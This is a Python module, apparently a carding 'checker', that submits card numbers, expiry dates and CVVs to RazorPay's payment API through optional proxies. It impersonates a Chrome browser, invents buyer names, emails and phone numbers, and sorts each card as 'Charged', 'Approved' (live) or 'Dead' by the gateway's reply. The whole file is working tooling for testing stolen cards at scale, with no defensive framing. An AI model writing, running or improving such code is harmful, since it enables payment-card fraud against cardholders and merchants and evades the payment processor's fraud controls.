"""
razorpay_engine.py — API-less RazorPay checkout engine.

Public API:
  - run_razorpay_public(page_url, card_entry, proxy_url) -> dict
"""
from __future__ import annotations

import os
import re
import json
import random
import time

try:
    from curl_cffi.requests import Session as CurlSession
    CURL_CFFI_OK = True
except ImportError:
    CurlSession = None
    CURL_CFFI_OK = False

_RAZOR_API = "https://api.razorpay.com/v1"
_RAZOR_UA = (
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36"
)
_RAZOR_FIRST = ["Aarav", "Rohan", "Kunal", "Vikas", "Amit", "Rahul", "Sahil", "Deepak"]
_RAZOR_LAST  = ["Sharma", "Patel", "Verma", "Singh", "Kumar", "Gupta", "Mehta"]
_RAZOR_PHONE = ["9876543210", "8765432109", "7654321098", "9123456780", "9998887770"]
_RAZOR_EMAIL_DOMAINS = ["gmail.com", "yahoo.in", "outlook.com", "protonmail.com"]


def _rz_random_email() -> str:
    f = random.choice(_RAZOR_FIRST).lower()
    l = random.choice(_RAZOR_LAST).lower()
    return f"{f}.{l}{random.randint(1, 999)}@{random.choice(_RAZOR_EMAIL_DOMAINS)}"


def _rz_new_client(proxy_url: str = "", timeout: float = 30.0):
    if not CURL_CFFI_OK:
        raise RuntimeError("curl_cffi not installed")
    kw = {"impersonate": "chrome131", "timeout": timeout, "verify": False}
    if proxy_url:
        kw["proxy"] = proxy_url
    s = CurlSession(**kw)
    s.headers.update({
        "user-agent": _RAZOR_UA,
        "accept": "application/json, text/plain, */*",
        "accept-language": "en-IN,en;q=0.9",
        "origin": "https://api.razorpay.com",
        "referer": "https://api.razorpay.com/",
    })
    return s


def _rz_extract_link_id(html: str) -> str | None:
    for pat in (
        r'"payment_link_id"\s*:\s*"([^"]+)"',
        r'"paymentLinkId"\s*:\s*"([^"]+)"',
        r'payment_link_id["\']?\s*[:=]\s*["\']([^"\']+)',
    ):
        m = re.search(pat, html)
        if m:
            return m.group(1)
    return None


def _rz_classify(message: str) -> tuple[bool, str]:
    if not message:
        return False, "Error"
    ml = message.lower()
    if any(k in ml for k in ("payment successful", "captured", "paid")):
        return True, "Charged"
    if any(k in ml for k in (
        "insufficient funds", "insufficient_funds",
        "insufficient account balance",
        "incorrect cvv", "incorrect cvc", "invalid cvv", "invalid cvc",
        "authentication required", "3d secure", "3ds", "otp",
        "requires_action", "authentication_required",
    )):
        return False, "Approved"
    if any(k in ml for k in (
        "cancelled", "canceled", "declined", "failed",
        "do not honor", "stolen", "lost", "expired",
        "card_not_supported", "restricted",
    )):
        return False, "Dead"
    if any(k in ml for k in ("timeout", "try again", "network", "server error",
                              "502", "503", "504")):
        return False, "Error"
    return False, "Dead"


def run_razorpay_public(page_url: str, card_entry: str, proxy_url: str = "") -> dict:
    """RazorPay checkout via API-less flow."""
    t0 = time.time()
    page_url = (page_url or "").strip().rstrip("/")
    if not page_url.startswith(("http://", "https://")):
        page_url = "https://" + page_url

    parts = card_entry.replace("/", "|").split("|")
    if len(parts) != 4:
        return {"ok": False, "status": "Error", "message": "invalid card format",
                "time": 0.0, "site": page_url}
    cc, mm, yy, cvv = [p.strip() for p in parts]
    if len(yy) == 2:
        yy = "20" + yy
    mm = mm.zfill(2)

    if not CURL_CFFI_OK:
        return {"ok": False, "status": "Error",
                "message": "curl_cffi not installed",
                "time": 0.0, "site": page_url}

    client = _rz_new_client(proxy_url)
    try:
        try:
            r = client.get(page_url, timeout=20)
        except Exception as e:
            return {"ok": False, "status": "Error",
                    "message": f"page fetch: {str(e)[:100]}",
                    "time": round(time.time() - t0, 2), "site": page_url}

        if r.status_code != 200:
            return {"ok": False, "status": "Error",
                    "message": f"page HTTP {r.status_code}",
                    "time": round(time.time() - t0, 2), "site": page_url}

        html = r.text or ""
        link_id = _rz_extract_link_id(html)

        email = _rz_random_email()
        phone = random.choice(_RAZOR_PHONE)
        name = f"{random.choice(_RAZOR_FIRST)} {random.choice(_RAZOR_LAST)}"

        payload = {
            "amount": "100",
            "currency": "INR",
            "email": email,
            "contact": phone,
            "method": "card",
            "card[number]": cc,
            "card[name]": name,
            "card[expiry_month]": mm,
            "card[expiry_year]": yy,
            "card[cvv]": cvv,
        }
        if link_id:
            payload["payment_link_id"] = link_id

        try:
            resp = client.post(
                f"{_RAZOR_API}/payments/create/json",
                data=payload,
                timeout=30,
            )
        except Exception as e:
            return {"ok": False, "status": "Error",
                    "message": f"submit: {str(e)[:100]}",
                    "time": round(time.time() - t0, 2), "site": page_url}

        try:
            body = resp.json() if resp.text else {}
        except Exception:
            body = {"error": {"description": (resp.text or "")[:200]}}

        err = body.get("error") or {}
        description = (
            err.get("description")
            or err.get("reason")
            or err.get("field")
            or body.get("status")
            or body.get("message")
            or ""
        )

        ok, status = _rz_classify(str(description))

        if body.get("status") in ("captured", "authorized"):
            ok = True
            status = "Charged"

        return {
            "ok":      ok,
            "status":  status,
            "message": (str(description) or "Unknown")[:200],
            "time":    round(time.time() - t0, 2),
            "site":    page_url,
        }
    except Exception as e:
        return {"ok": False, "status": "Error",
                "message": f"engine: {str(e)[:120]}",
                "time": round(time.time() - t0, 2), "site": page_url}
    finally:
        try:
            client.close()
        except Exception:
            pass
